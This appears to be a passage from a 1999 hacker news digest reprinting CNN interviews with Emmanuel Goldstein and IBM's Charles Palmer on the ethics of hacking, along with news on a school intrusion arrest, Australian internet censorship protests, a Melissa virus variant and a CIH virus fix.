                      when you keep asking questions or inputting
                      commands over and over and over. But
                      hacking doesn't have to confine itself to
                      computers. Anyone with an inquisitive mind,
                      a sense of adventure and strong beliefs in
                      free speech and the right to know most
                      definitely has a bit of the hacker spirit in
                      them. 

                 2. Are there legal or appropriate forms of
                 hacking? 

                      One of the common misconceptions is that
                      anyone considered a hacker is doing
                      something illegal. It's a sad commentary on
                      the state of our society when someone who
                      is basically seeking knowledge and the truth
                      is assumed to be up to something nefarious.
                      Nothing could be further from the truth. 

                      Hackers, in their idealistic naivetΘ, reveal
                      the facts that they discover, without
                      regard for money, corporate secrets or
                      government coverups. We have nothing to
                      hide, which is why we're always relatively
                      open with the things we do -- whether it's
                      having meetings in a public place or running
                      a system for everyone to participate in
                      regardless of background. The fact that we
                      don't "play the game" of secrets also makes
                      hackers a tremendous threat in the eyes of
                      many who want to keep things away from
                      the public. 

                      Secrets are all well and good, but if the
                      only thing keeping them a secret is the fact
                      that you say it's a secret, then it's not
                      really a very good secret. We suggest using
                      strong encryption for those really interested
                      in keeping things out of the hands of
                      outsiders. It's interesting also that hackers
                      are the ones who are always pushing strong
                      encryption -- if we were truly interested in
                      getting into everyone's personal affairs, it's
                      unlikely we'd try and show them how to
                      stay secure. There are, however, entities
                      who are trying to weaken encryption.
                      People should look toward them with
                      concern, as they are the true threat to
                      privacy. 

                 3. What in your mind is the purpose of
                 hacking? 

                      To seek knowledge, discover something
                      new, be the first one to find a particular
                      weakness in a computer system or the first
                      to be able to get a certain result from a
                      program. As mentioned above, this doesn't
                      have to confine itself to the world of
                      computers. Anyone who's an adventurer or
                      explorer of some sort, or any good
                      investigative journalist, knows the feeling of
                      wanting to do something nobody has ever
                      done before or find the answer despite
                      being told that you can't. One thing that all
                      of the people involved in these endeavors
                      seem to share is the feeling from outsiders
                      that they're wasting their time. 

                 4. Are you a hacker? Why? Or why not? 

                      Absolutely. It's not something you can just
                      erase from your personality, nor should you
                      want to. Once you lose the desire to mess
                      around with things, tweak programs and
                      systems, or just pursue an answer doggedly
                      until you get a result, you've lost a very
                      important part of yourself. It's quite
                      possible that many "reformed" hackers will
                      lose that special ingredient as they become
                      more and more a part of some other entity
                      that demands their very souls. But for those
                      who can resist this, or figure out a way to
                      incorporate "legitimacy" into their hacker
                      personalities without compromising them,
                      there are some very interesting and fun
                      times ahead. 

                 5. What kind of hacking do you do? 

                      My main interest has always been phones
                      and rarely does a day pass when I don't
                      experiment in some way with a phone
                      system, voice mail system, pay phone, or
                      my own telephone. I've always been
                      fascinated by the fact that we're only a
                      few buttons away from virtually anyone on
                      the planet and I hope that I never lose that
                      sense of marvel. 

                      One of the most amazing things I ever got
                      involved in was routing phone calls within
                      the network itself -- known as blue-boxing.
                      You can't do that as easily any more, but it
                      was a real fun way to learn how everything
                      was connected -- operators, services,
                      countries, you name it. And in the
                      not-too-distant past, there were so many
                      different sounds phones made depending on
                      where you were calling. Now they tend to
                      be standardized rings, busies, etc. But the
                      magic hasn't disappeared, it's just moved on
                      to new things ... satellite technology, new
                      phone networks and voice recognition
                      technologies. 

                      Many times these new technologies are
                      designed by the very people who were
                      hacking the old technologies. The result is
                      usually more security and systems that
                      know what people will find useful. While I've
                      spent a great deal of time playing with
                      phones, I get the same sense of fun from
                      computer systems and have invested lots of
                      time exploring the Internet. It would fill a
                      book to outline all of the hacker potential
                      that exists out there. And, of course,
                      there's radio hacking, which predates a lot
                      of the current technology. It's gotten to
                      the point where simply listening to a certain
                      frequency has become a challenge. It's hard
                      to believe that it's actually turned into a
                      crime to listen to some of these
                      non-scrambled radio waves. But this is the
                      price we pay when people with no
                      understanding of technology are the ones in
                      charge of regulating it. 

                 6. How much time do you spend at it a week? 

                      That's like asking how much time you spend
                      breathing. It's always with you, you do
                      more of it at certain times, but it's always
                      something that's going on in your head.
                      Even when I sleep, I dream from a hacker
                      perspective. 

                 7. Do you have a certain kind of site or
                 "target" sites that most attract you? 

                      We don't sit around with a big map and a
                      list of targets. In fact, we don't even sit
                      around together. Most hacking is done by
                      individuals who simply find things by
                      messing around and making discoveries. We
                      share that info and others add input. Then
                      someone tells the press and the
                      government that we're plotting to move
                      satellites and all hell breaks loose. 

                      I think most of us tend to be drawn to the
                      sites and systems that are said to be
                      impossible to access. This is a normal
                      human reaction to being challenged. The
                      very fact that we continue to do this after
                      so many of us have suffered so greatly
                      indicates that this is a very strong driving
                      force. When this finally becomes recognized
                      as a positive thing, perhaps we'll really be
                      able to learn from each other. 

                 8. What, in general, do you think attracts
                 people to hacking? 

                      People have always been attracted to
                      adventure and exploration. Never before
                      have you been able to get this without
                      leaving your house and without regard to
                      your skin color, religion, sex, or even the
                      sound of your voice. On the Internet,
                      everyone is an equal until they prove
                      themselves to be a moron. And even then,
                      you can always start over. It's the ability to
                      go anywhere, talk to anyone, and not
                      reveal your personal information unless you
                      choose to -- or don't know enough not to
                      -- that most attracts people to the hacker
                      culture, which is slowly becoming the
                      Internet culture. 

                      We find that many "mainstream" people
                      share the values of hackers -- the value of
                      free speech, the power of the individual
                      against the state or the corporation, and
                      the overall sense of fun that we embrace.
                      Look in any movie where an individual is
                      fighting a huge entity, and who does the
                      audience without exception identify with?
                      Even if the character breaks the rules, most
                      people want him/her to succeed because
                      the individual is what it's all about. 

                 9. Do you know enough hackers personally to
                 know what personality traits they share, if
                 any? 

                      Hackers come from all different backgrounds
                      and have all kinds of lifestyles. They aren't
                      the geeks you see on television or the
                      cyberterrorists you see in Janet Reno news
                      conferences. They range in age from under
                      10 to over 70. They exist in all parts of the
                      world, and one of the most amazing and
                      inspiring things is to see what happens
                      when they come together. It's all about
                      technology, the thrill of discovery, and
                      sharing information. That supersedes any
                      personality issues that might be an issue in
                      other circumstances. 

                 10. Do you think hackers are productive and
                 serve a useful purpose? 

                      I think hackers are necessary, and the
                      future of technology and society itself
                      (freedom, privacy, etc.) hinges on how we
                      address the issues today that hackers are
                      very much a part of. This can be the
                      dawning of a great era. It can also be the
                      beginning of true hell. 

                 11. What percentage would you say are
                 destructive as opposed to those in it out of
                 intellectual curiosity or to test their skills? 

                      This raises several points that I feel
                      strongly about. For one thing, hacking is
                      the only field where the media believes
                      anyone who says they're a hacker. Would
                      you believe someone who said they were a
                      cop? Or a doctor? Or an airline pilot? Odds
                      are they'd have to prove their ability at
                      some point or say something that obviously
                      makes some degree of sense. But you can
                      walk up to any reporter and say you're a
                      hacker and they will write a story about you
                      telling the world that you're exactly what
                      you say you are without any real proof. 

                      So every time a movie like "Hackers" comes
                      out, 10 million people from AOL send us
                      e-mail saying they want to be hackers, too,
                      and suddenly, every 12-year-old with this
                      sentiment instantly becomes a hacker in the
                      eyes of the media and hence, the rest of
                      society. You don't become a hacker by
                      snapping your fingers. It's not about getting
                      easy answers or making free phone calls or
                      logging into someone else's computer.
                      Hackers "feel" what they do, and it excites
                      them. 

                      I find that if the people around you think
                      you're wasting your time but you genuinely
                      like what you're doing, you're driven by it,
                      and you're relentless in your pursuit, you
                      have a good part of a hacker in you. But if
                      you're mobbed by people who are looking
                      for free phone calls, software or exploits,
                      you're just an opportunist, possibly even a
                      criminal. We already have words for these
                      people and it adequately defines what they
                      do. While it's certainly possible to use
                      hacking ability to commit a crime, once you
                      do this you cease being a hacker and
                      commence being a criminal. It's really not a
                      hard distinction to make. 

                      Now, we have a small but vocal group who
                      insist on calling anyone they deem
                      unacceptable in the hacker world a
                      "cracker." This is an attempt to solve the
                      problem of the misuse of the word "hacker"
                      by simply misusing a new word. It's a very
                      misguided, though well-intentioned, effort.
                      The main problem is that when you make up
                      such a word, no further definition is
                      required. When you label someone with a
                      word that says they're evil, you never really
                      find out what the evil was to begin with.
                      Murderer, that's easy. Burglar, embezzler,
                      rapist, kidnapper, all pretty clear. Now along
                      comes cracker and you don't even know
                      what the crime was. It could be crashing
                      every computer system in Botswana. Or it
                      could be copying a single file. We need to
                      avoid the labeling and start looking at what
                      we're actually talking about. But at the
                      same time, we have to remember that you
                      don't become a hacker simply because you
                      say you are. 

                 12. Do people stay in hacking a long time, or
                 is it the kind of thing that people do for a few
                 years and then move on to something else? 

                      It can be either. I tend to believe that it's
                      more of a philosophy, a way of looking at
                      something. When you have the hacker
                      perspective, you see potential where others
                      don't. Also, hackers think of things like
                      phones, computers, pagers, etc., as toys
                      and things to be enjoyed whereas others
                      see work and responsibility and actually
                      come to dread these things. That's why
                      hackers like to hold onto their world and not
                      become part of the mainstream. But it
                      certainly can and does happen. 

                 13. What is the future of hacking? 

                      As long as the human spirit is alive, there
                      will always be hackers. We may have a hell
                      of a fight on our hands if we continue to be
                      imprisoned and victimized for exploring, but
                      that will do anything but stop us. 

                 14. Given increased attention to corporate
                 and government security, is it getting tougher
                 to hack or not? 

                      Hacking isn't really about success -- it's
                      more the process of discovery. Even if real
                      security is implemented, there will always
                      be new systems, new developments, new
                      vulnerabilities. Hackers are always going to
                      be necessary to the process and we're not
                      easily bored. 

                 15. Is the possibility of being identified and
                 even prosecuted an issue for most hackers? 

                      Hackers make very bad criminals. This is
                      why we always wind up being prosecuted.
                      We don't hide very well or keep our mouths
                      sealed shut to protect corporate or
                      government interests. But the same
                      security holes would exist even if we
                      weren't around, so I think the hackers
                      should be properly seen as messengers.
                      That doesn't mean that you should expect
                      them to just hand over all of their
                      knowledge -- it's important to listen and
                      interpret on your own, as any hacker would.

                 16. Are there hackers who are up for hire?
                 What are they paid? Who hires them, and for
                 what? 

                      Just as you can use hacker ability to attain
                      a life of crime, you can use that ability to
                      become a corporate success. Some are able
                      to hold onto their hacker ideals. Others,
                      sadly, lose them. It's especially hard when
                      young people who haven't worked it all out
                      yet are approached and tempted with huge
                      amounts of money by these entities. It can
                      be very hard to resist and the cost is often
                      greater than anticipated. 

                 17. Have you had any contact with people
                 you consider cyberterrorists? Do you endorse
                 what they do? 

                      In all of the time I've been in the scene,
                      which is a pretty long time, I've never come
                      across anyone I consider to be a
                      "cyberterrorist," whatever that is. Most
                      people who talk of such creatures either
                      have something to sell or some bill to pass.
                      This is not to say that such a concept is
                      impossible. But I believe the current
                      discussions aren't based in reality and have
                      very suspicious ulterior motives. 

                 18. What about the people who hack into
                 Pentagon sites? Do you think they should be
                 punished? 

                      According to the Pentagon, there is no risk
                      of anything classified being compromised
                      because it's not on the Internet. If they
                      were wrong, I would like to see someone
                      prove that. If a non-classified site is
                      hacked, I don't see the harm unless
                      something is damaged in some way.
                      Remember, the security hole was already
                      there. If a hacker finds it, it's far more likely
                      the people running the system will learn of
                      the hole. If a criminal or someone with an
                      ulterior motive (espionage, etc.) finds the
                      hole first, it's likely to remain secret for
                      much longer and the harm will be far
                      greater. 

                      While you may resent the fact that some
                      14-year-old from Topeka proved your
                      security sucks, think of what could have
                      happened had you not learned of this and
                      had someone else done it instead. I'm the
                      first to say that people who cause damage
                      should be punished, but I really don't think
                      prison should be considered for something
                      like this unless the offender is a true risk to
                      society. The great majority of these cases
                      do not involve damage or vandalism, a fact
                      that largely goes unreported. What people
                      have to remember is that most of the time,
                      this is simply an example of kids being kids
                      and playing games like they have always
                      done. 

                      Obviously, the tools have changed, but
                      that's really not something the kids are
                      responsible for. If some kid somewhere can
                      access your medical records or your phone
                      records, he or she is not the one who put
                      them there. The true violator of your
                      privacy is the person who made the
                      decision to make them easily accessible. 

                 19. Your real name is Eric Corley. Why do you
                 use the name Emmanuel Goldstein? 

                      I believe everyone should be given the
                      opportunity to name themselves. That name
                      should reflect something about who you are
                      and what you believe in and stand for.
                      Emmanuel Goldstein is that for me, and for
                      those who want to learn why, get a copy of
                      George Orwell's "1984" and see for yourself.
                      Interestingly, our first issue of 2600 was
                      published in January 1984. A complete
                      coincidence. 

 19.0 [CNN] 'Hacking is a felony': Q&A with IBM's Charles Palmer      
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
      
      http://www.cnn.com/TECH/specials/hackers/qandas/
      

                 Q&A with IBM's Charles Palmer

                 (CNN) -- Dr. Charles C. Palmer is the manager of
                 Network Security and Cryptography and head of
                 the Global Security Analysis Lab, which includes
                 IBM's ethical hacking unit. 

                 1. How do you define hacking? 

                      Hacking is unauthorized use of computer
                      and network resources. (The term "hacker"
                      originally meant a very gifted programmer.
                      In recent years though, with easier access
                      to multiple systems, it now has negative
                      implications.) 

                 2. Are there appropriate forms of hacking? 

                      Hacking is a felony in the United States and
                      most other countries. When it is done by
                      request and under a contract between an
                      ethical hacker and an organization, it's OK.
                      The key difference is that the ethical
                      hacker has authorization to probe the
                      target. 

                 3. What do you and the other members of
                 your team do? 

                      (We) work with IBM Consulting and its
                      customers to design and execute thorough
                      evaluations of their computer and network
                      security. Depending on the evaluation they
                      request (ranging from Web server probes to
                      all-out attacks), we gather as much
                      information as we can about the target
                      from publicly available sources. As we learn
                      more about the target, its subsidiaries and
                      network connectivity, we begin to probe for
                      weaknesses. Examples of weaknesses
                      include poor configuration of Web servers,
                      old or unpatched software, disabled
                      security controls, and poorly chosen or
                      default passwords. As we find and exploit
                      vulnerabilities, we document if and how we
                      gained access, as well as if anyone at the
                      organization noticed. (In nearly all the
                      cases, the Information Syhstems
                      department is not informed of these planned
                      attacks.) Then we work with the customer
                      to address the issues we've discovered. 

                 4. What is the background of the people on
                 your team? 

                      We have Ph.D.s in physics, computer
                      scientists, and even one former
                      photographer with a fine arts degree. They
                      are all well-known, highly respected system
                      security professionals from around the
                      world. Most of them did not start their
                      careers in this area, but ended up doing
                      computer and network security because
                      they were provoked by hackers at one time.
                      Once they started on the road to improving
                      security, they got hooked on the challenges
                      it presents. 

                 5. In "Helpful Hacking" from IBM Research
                 magazine in 1997, you are quoted as saying
                 you don't hire reformed hackers and "there's
                 no such thing." Could you explain? 

                      The number of really gifted hackers in the
                      world is very small, but there are lots of
                      wannabes.... When we do an ethical hack,
                      we could be holding the keys to that
                      company once we gain access. It's too
                      great a risk for our customers to be put in a
                      compromising position. With access to so
                      many systems and so much information, the
                      temptation for a former hacker could be too
                      great -- like a kid in an unattended candy
                      store. 

                 6. Is it fair to say that you are opposed to
                 hacking? 

                      As I said before, hacking is a felony -- for
                      good reason. Some of the "joyriders" --
                      hackers who access systems just for the
                      challenge -- think it's harmless since they
                      usually don't "do" anything besides go in
                      and look around. But if a stranger came into
                      your house, looked through everything,
                      touched several items, and left (after
                      building a small, out of the way door to be
                      sure he could easily enter again), would you
                      consider that harmless? These joyriders
                      could be causing damage inadvertently
                      since just by their presence they are using
                      system resources. 

                 7. Do you think hacking can be useful? 

                      Hacking can be useful in a controlled
                      environment where there are ground rules
                      and contractual agreements. 

                 8. Do you have a profile of the typical hacker?

                      The profile has broadened in the last couple
                      of years to include many types of people,
                      which makes it very difficult to call out a
                      "typical" hacker. The motivations behind
                      hacking have changed (see Answer No. 11
                      below). No longer are hackers limited to the
                      teen-age, soda-slurping misfits, although
                      they're probably the majority. There are
                      girls and even younger kids. Many
                      companies think all hackers come from
                      outside, but surveys continue to show that
                      the threat from inside an organization is
                      greater than from outside. So if your
                      system is compromised, it could be a
                      Gen-Xer sitting in a dark apartment, or the
                      woman in the cubicle next to you. 

                 9. There have been reported instances where
                 corporate security personnel have tracked
                 hacking back to the source, broken in and
                 stolen computers, or even used force. Do you
                 endorse "vigilantism" as a response to
                 hacking? 

                      I've heard those stories, too, and I don't
                      believe most of them. It makes zero sense
                      to respond to an illegal attack with another
                      illegal attack. First of all, it can be very
                      difficult to accurately determine where an
                      attack comes from. Whether they end up
                      retaliating against the right or wrong
                      person, they've committed a felony and are
                      just as guilty as the original perpetrator. It's
                      no different than other forms of vigilante
                      justice. 

                 10. What about attacking Web sites that list
                 hacking scripts? 

                      Again, any attack is a felony. It's a First
                      Amendment rights issue as well. Where do
                      you draw the line? Attacking adult sites?
                      Attacking spammers? It makes more sense
                      for corporations, schools and other
                      organizations to try to block access to
                      those sites. 

                 11. Can you characterize the nature of most
                 hacking attacks? 

                      A few years ago, the original motivations
                      were pursuit of knowledge and the desire to
                      "show off" one's skills. Now, there are new
                      lures of money and power. However, the
                      statistics can be misleading, so many of
                      these incidents go unreported due to lack
                      of detection or fear of further losses due to
                      tarnished image and credibility. 

                      I believe that the majority of hacks are still
                      motivated by curiosity and a desire to point
                      out system weaknesses. However, as
                      organizations have been finding, most of
                      today's threats come from within the
                      organization. According to a recent META
                      Group study, current figures indicate that
                      recent breaches of security within
                      Information Technology organizations occur
                      internally 58 percent of the time. The
                      threat from the outside is rising at a steady
                      rate, though. 

                 12. Is there a trend in these attacks? 

                      Denial-of-service attacks and macro-viruses
                      are the most popular hacker activities. The
                      denial-of-service attacks are fairly easy for
                      hackers of all skill levels -- from "script-kids"
                      to professionals -- to launch. This is a
                      situation where a company's Web site or
                      online service is simply made unavailable by
                      a hacker overtaxing the system resources.
                      It doesn't sound that harmful, but there can
                      be serious monetary and image losses
                      attached to this. If you want to buy a book
                      and you go to a popular book-selling Web
                      site and find that site unavailable, chances
                      are you'll try the next most popular book
                      Web site. There's simply too much
                      competition on the Internet right now to
                      overlook security needs. These
                      denial-of-service attacks are particularly
                      troubling because they are hard to defend
                      against. There are defenses available with
                      firewall products from IBM and other
                      companies, but there can be
                      denial-of-service attacks from inside as
                      well, which lends credence to the argument
                      for Intranet firewalls. 

                 13. Where does the real threat of hacking lie:
                 in the private sector, in government or
                 somewhere else? 

                      The widely reported attacks against
                      government sites are troubling, but it's a
                      good bet that the government would not
                      have any sensitive information on a machine
                      connected to the Internet. An unfortunate
                      side effect of these reports is that people
                      end up thinking that securing systems and
                      networks is hard. It's not hard, but it does
                      take time and training, and it's an ongoing
                      process to stay one step ahead of the bad
                      guys. 

                      Corporate espionage is also a threat, but
                      not in the glamorous way portrayed in the
                      movies. There, the threat is from the inside.
                      There have been many reports of
                      employees purposely sending proprietary
                      information outside the company to other
                      companies, perhaps just before they
                      themselves move to that company. The
                      greater connectivity that employees have
                      today also leads them to inadvertent leaks
                      via e-mail. 

                 14. To what extent is cyberterrorism a
                 genuine concern? 

                      There is little motivation for industrial
                      control systems like those running nuclear
                      plants or airports to be on the open Web.
                      They may have dial-up access or private
                      networks within the organization that would
                      be susceptible to attack from the inside.
                      IBM has found that it can be quicker and
                      cheaper to attack a target physically,
                      rather than digitally -- we've nonchalantly
                      walked into businesses, snooped around,
                      and walked out with confidential material
                      (once with the security guard holding the
                      door for us!). And there are many examples
                      of unfortunate accidents that resulted in
                      very effective "attacks." The most common
                      example is the "backhoe attack," where an
                      errant heavy-equipment operator
                      accidentally cut a communications cable. 

                      ... I don't think we are "at war," because in
                      this problem the enemy includes ourselves.
                      We view it more as a race -- we're all trying
                      to stay a few steps ahead of the threats ...
                      through improved education and
                      technology. ... The good news is that
                      people are thinking about these issues, and
                      some groups appear to be taking action. 

                 15. What about responses such as the recent
                 Pentagon counteroffensive that redirected
                 hackers' attack to an applet that caused their
                 browsers to crash? Is that an appropriate
                 response to hackers? 

                      Anytime you acknowledge the hacker, you
                      run the risk of heightening his or her
                      interest. If you change the game from
                      solitaire to a real poker game with human
                      opponents, it becomes more interesting to
                      most hackers. Such retaliation is also
                      short-lived, since countermeasures will
                      quickly be developed and publicized around
                      the Web. In my opinion, this is not an
                      effective usage of limited security
                      personnel. 

                 16. Are anti-hacking measures improving? 

                      The most important improvement is in the
                      area of awareness. ... Advances in firewall
                      technology (making them easier to install
                      and configure), improvements in
                      vulnerability scanning and better
                      explanations of how to repair them, and
                      better intrusion-detection with fewer
                      false-positives are all key technologies in
                      this race. 

                 17. If attacks can only take place on
                 computers that are online, to what extent
                 could hacking be mitigated by keeping
                 sensitive materials, data, etc., offline? 

                      One of my colleagues at IBM likes to say,
                      "only trust physics." My version is that the
                      only 100 percent, truly secure system is
                      one that is powered-off and filled with
                      concrete. The military has long understood
                      the security of an "air gap" (where a secure
                      machine has no connection whatsoever to
                      an unsecured machine), and we recommend
                      to our customers that they consider such
                      an arrangement for their most secure
                      systems. This comes down to risk-analysis
                      -- that is, weighing the cost in convenience
                      and availability against the threat of having
                      a system online. 

                      If it's important to ... your business to have
                      data available online inside the company,
                      then protecting it with an internal firewall
                      makes sense. ... If you have a Web server
                      you want your customers to access, you
                      can't hide it behind your corporate firewall
                      because they won't be able to get to it.
                      There are network designs that will enable
                      you to position the Web server on the
                      "outside," while securely maintaining a
                      connection between it and, perhaps, a
                      server behind the firewall. 

                 18. What is the long-term outlook for
                 hacking? 

                      As long as there are unsecured computers
                      with interesting stuff on them, there will be
                      hackers. Law enforcement agencies have
                      stepped up their facilities and training
                      programs to meet the demand for computer
                      and network security. 

                      Moving toward technologies that use strong
                      encryption will greatly improve the overall
                      security of systems. Virtual Private
                      Networks are a fantastic tool for companies
                      and governments to protect their systems
                      and networks while taking advantage of the
                      low-cost, high-availability offered by the
                      Internet. Internet standards bodies are also
                      moving toward designing security into new
                      standards. 

                      Most kids today know much more about
                      computers than their parents do, and some
                      start "messing around" at earlier ages than
                      in the past. The best thing we can do is to
                      show them how interesting it can be to
                      work at protecting systems and networks. 

                 19. What about the outlook for computer
                 security? 

                      While better security technologies are
                      appearing all the time, education and
                      awareness will continue to be the limiting
                      factor. System administrators must learn
                      about and maintain their systems securely.
                      Users have to understand their security
                      responsibilities (like choosing good
                      passwords, not installing unauthorized
                      modems, etc.). ... Innovations like
                      biometrics and smart cards will go a long
                      way toward making security easier for the
                      end user as well as for the system    
                      administrators.

      Five arrested for hacking into high school system
      By MATT GOWEN
      
      
      BUNNELL - Five Flagler Palm Coast High School students - one the son of a
      Bunnell city commissioner - are facing a litany of criminal charges after
      authorities said they used a computer virus to hack into the school's
      network and commandeer teacher and student files.
      
      
      Flagler County sheriff's deputies arrested the students Monday. All five
      were taken to the Division of Youth Services in Daytona Beach before being
      released to their parents. 
      
      
      Facing the brunt of the allegations are Steven Alverson, 17, and Daniel
      Bixby, 16, both of Palm Coast. Alverson was charged with 16 separate
      felony counts, eight for crimes involving computers and eight for crimes
      against computer users. Bixby was charged with 12 similar counts. Alverson
      and Bixby were suspended until the end of the school year, June 4.
      
      
      Arrested on two felony charges each were Yen Chen, 16, and Henry
      Cervantes, 17, both of Palm Coast, and Daniel Dupont, 17, of Bunnell, son
      of City Commissioner Catherine Robinson. School officials gave Chen,
      Cervantes and Dupont in-school suspension until the end of the year.
      
      
      The five will be allowed to return to take final exams June 7 and 8. 
      
      
      As for the criminal case, the State Attorney's Office will now decide
      whether formal charges should be filed.
      
      
      The arrests capped a lengthy investigation into the presence of the virus
      - a disabling computer program that gave the students access to teacher
      grade books and to exams on the system, according to reports.
      
      
      The virus was initially discovered April 8 by technology support
      personnel who were upgrading the school's protective software. In a
      subsequent investigation, reports said, the school's computer experts
      found that each of the five students had downloaded a "hacker tool" from
      the Internet into their personal computer accounts. 
      
      
      FPCHS Assistant Principal Allan Haller said no grades were changed but
      that grade files were deleted and exams were compromised.
      
      
      "It was more mischievous than anything else," Haller said. 
      
      
      Still, he said, the high school's computer network connects to the
      districtwide system, meaning the students could have eventually broken
      into financial and payroll records or general personnel files.
      
      
      "It could have been very disruptive," Haller said. "They could have shut
      down the whole system."
      
      
      The arrested students either preferred not to comment or could not be
      reached for comment.
      
      
      Robin Alverson, Steven Alverson's mother, said her son insisted he was
      innocent of any criminal wrongdoing and offered to take a lie detector
      test or voice-stress analysis to prove it.
      
      
      "Steven is very computer literate," Robin Alverson said. "He is not
      stupid. He knows that anything he does on there can be traced. That's the
      thing that gets me."
      
      
      One of their classmates, who asked not to be identified, said he thought
      the group had simply downloaded games off the Internet and that one had a
      virus attached to it.
      
      
      But sheriff's reports describe a highly technical process - set in motion
      Jan. 4 - involving hidden and renamed viruses that blocked administrators'
      access to their files, making the path more difficult to trace.
      
      
      "These students were very good," Flagler County School Superintendent
      Robert Williams said, alleging that they viewed breaking into the system
      as a challenge or game.  "They were running our people ragged trying to
      keep up with them."
      
      
      Williams added that it was the first time the district has dealt with
      unauthorized internal computer access, and that the disciplinary code will
      be revamped accordingly over the summer.
      
      
      The high school has four classroom computer labs, and Haller estimated
      the school has more than 100 computers that connect to the Internet.
      
      
      In the fall, each student is given his or her own password-protected
      computer account to do research or work on word processing programs.
      Students and parents must sign an agreement on proper use. 
      
      
      "Some of them choose to use their talents inappropriately," Haller said,
      adding that peer pressure may have played a role. "Whether it's a macho
      thing, whether it was a battle over school territory or whether they were
      out to prove a point - 'We're smarter than you' - it's hard to say." 
      
      
      And as recent news reports demonstrate, even large agencies such as NASA
      are not insulated from the potential for break-ins. 
      
      
      "We're a high school," Haller said. "We don't begin to have the kinds of
      resources that the federal government has for protection."

 21.0 Danes Finger Swede for Cracking 12,000 Systems 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      From HNN http://www.hackernews.com

      contributed by Phoz 
      The Danish Police Computer Crime Unit have exposed a 17-year old from Sweden 
      claiming that he broke into at least 12,000 computers worldwide, including

      The Electronic Frontiers Australia have announced several protest events to 
      take place on Friday May 28. Local groups around Australia have been urged 
      to co-ordinate protests against government censorship. Australia's proposed
      internet censorship legislation passed the Senate on Wednesday, and is expected 
      to pass through the House of Representatives some time next week.

      Internet providers plotting revenge over bill 
      
      By LAUREN MARTIN, in Canberra 
      
      Angry Internet service providers turned on the Government after its bill to
      censor the Internet passed the Senate yesterday.
      
      Requests from Government computer users were diverted to a protest page
      which made the users wait 120 seconds before reaching their desired
      destination.
      
      "Get used to the delay," came the message. It was a warning that the plan
      would slow the system.
      
      Civil libertarians also protested by turning their computer Web site screens
      black to mark their belief that the Government had - in the words of
      Democrats Senator Natasha Stott Despoja - "turned its back on the Internet".
      
      Anti-censorship group Electronic Frontiers Australia is organising nationwide
      rallies for tomorrow in the real world - Sydney, Melbourne, Perth, Brisbane,
      Adelaide and Wollongong.
      
      One family-owned Internet provider in western Sydney, RP Internet Services,
      yesterday was offering a month's untimed calls or 500 megabytes of data for
      clients who showed up. 
      
      The company hopes to hire a hearse for the Sydney protest, which will move
      from Hyde Park to the offices of the Australian Broadcasting Authority and the
      Office of Film and Literature Classification.
      
      Already one West Australian-based ISP had sent each senator a copy of
      George Orwell's 1984, with a note: "The Online Services Bill is Orwellian in its
      implications. It has no place in a free society."
      
      But the bill is expected to move smoothly through the House of
      Representatives and become law.
      
      It outlines a complaints-based regime under which the ABA can force Internet
      providers to remove material which would be considered offensive or illegal
      under film and video guidelines.
      
      If the material is not removed within one working day, ISPs face penalties of
      tens of thousands of dollars.
      
      The chief executive of the Internet Industry Association, Mr Peter Coroneous,
      said the bill represented a "huge challenge".
      
      "This has never been attempted anywhere in the world before, and people must
      realise that we cannot necessarily come out with a magic bullet tomorrow."
      
      The Communications Minister, Senator Alston, said the bill would "protect
      Australian citizens, especially children" from unsuitable Internet sites.
      
      But EFA president and Internet lawyer, Mr Kim Heitman, said it would not
      protect anyone.
      
      International sites (more than 90 million) could not be effectively blocked, he
      said. Adult sites based in Australia would move offshore or underground.
      
      "The internet is going to effortlessly evade the bill," Mr Heitman said. "It does
      nothing but make us an international laughing stock for saying we can do the
      impossible - it's a con job ...
      
      "If the Government was serious about Internet content, they would pay to
      educate parents and give police the resources to hunt down people who create
      illegal content."

      contributed by nVirb 
      Variants of the word Macro virus known as Melissa
      continue to appear. This time the mutant disguises itself
      in a '.rtf' named document as opposed to '.doc' which
      helps to hide it from anti-virus software. It has been
      speculated that Melissa and a virus known as CAP
      discovered in 1997 may have met in the wild and
      mutated together.

      Melissa Mutant Appears 

      Virus variation is disguised as an RTF file and
      hides from vaccines.

      by Matthew Nelson, InfoWorld Electric 
      May 27, 1999, 3:55 a.m. PT 

      The Melissa virus, which swept across networks
      around the world last month, has popped up again in a
      mutated format, which may have occurred when it
      came into contact with another virus. 

      Melissa's latest variation uses a macro virus to
      replicate itself across networks as the original did, but
      now it changes the file extension of the Word
      document from .doc to .rtf. This may effectively
      camouflage the virus from antivirus systems that look
      only for the .doc version of the attack. 

      The virus is not actually an RTF document, but is a
      Word file masquerading as an RTF file, as RTF files
      cannot contain macros.

      "An RTF file cannot contain macros, so it cannot
      contain macro viruses," says Sal Viveros, group
      marketing manager for Total Virus Defense at Network
      Associates, which was contacted about the virus by a
      user. "But with Word you can name your extensions
      any name you want, so all this virus writer did was
      change the list.doc in Melissa to list.rtf." 

      Mutating in the Wild?

      The RTF Melissa virus is similar to the CAP virus,
      which was discovered in 1997 and altered .doc files to
      .rtf files. CAP was summarily added to antivirus
      application lists to guard against.

      But given the similarity of the two viruses, and the
      possible results of an interaction between the two,
      Viveros speculates that the two viruses might have met
      and mutated in the wild. 

      If a system infected with CAP virus also contracted
      Melissa, then CAP could have altered the Melissa files
      to replicate as RTF files and then continued to spread
      the infection. 

      "It could have been that someone had the CAP virus on
      their system who got infected by Melissa," says
      Viveros. "Maybe it was accidental that this was
      changed to RTF." 

      There is no way to be sure, Viveros adds. This new
      version of the Melissa virus is one of many copycat
      viruses discovered since the initial outbreak of the virus.

      To protect against the latest version of Melissa,
      Network Associates and other antivirus vendors
      recommend that you update your antivirus data
      definitions regularly and be cautious opening
      suspicious messages, especially ones fitting the
      Melissa profile of "Important message from ..".

      Chernobyl Virus Cure Found in Australia 


      contributed by nvirB 
      With the 26th of the month arriving quickly developers
      have been scrambling to create a fix for variants of the
      CIH or Chernobyl Virus which may strike tomorrow. CIH
      attacks a system by corrupting both the the File
      Allocation Table and the BIOS. Developers in Australia
      claim that they have created a program that will rebuild
      the FAT table of an infected system. However, they
      have been unable to solve the BIOS corruption problem.

      Local developer nukes Chernobyl bug
      By IAN GRAYSON
    
      25may99
    
      A QUEENSLAND software expert has developed a fix for the malevolent
      CIH virus, which corrupts hard drives, making PCs inoperable. 
    
      The virus, dubbed Chernobyl because it struck on the anniversary of
      the nuclear accident, hit hundreds of thousands of PCs worldwide on
      April 26. 
    
